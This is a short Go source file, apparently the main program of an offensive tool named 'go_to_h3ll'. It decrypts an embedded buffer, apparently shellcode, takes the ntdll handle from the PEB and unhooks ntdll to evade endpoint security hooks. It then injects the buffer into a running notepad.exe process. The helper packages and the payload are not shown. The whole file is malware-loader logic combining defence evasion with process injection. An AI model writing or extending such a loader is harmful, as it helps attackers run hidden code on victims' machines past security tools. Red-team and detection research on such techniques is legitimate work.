package main

import (
	"fmt"
	"go_to_h3ll/core"
	"go_to_h3ll/encryption"
	"go_to_h3ll/evasion"
	"go_to_h3ll/execution"
)

func main() {

	encryption.Encrypt()
	buf := encryption.Decrypt()
	fmt.Println((len(buf)))

	hNtdll, err := core.GetModuleHandleFromPEB("nTdll.dll")
	if err != nil {
		fmt.Println("error getting handle from GetModuleHandleFromPEB")
		return
	}
	evasion.UnhookNtdll(hNtdll)
	core.CheckLoadNtFunctions(hNtdll)
	execution.ProcessInjectionUnhooked(uintptr(execution.ProcessEnumeration("notepad.exe")), &buf[0], uintptr(len(buf))) //inject into notepad.exe address space
	//fmt.Println(processEnumeration("notepad.exe"))
}
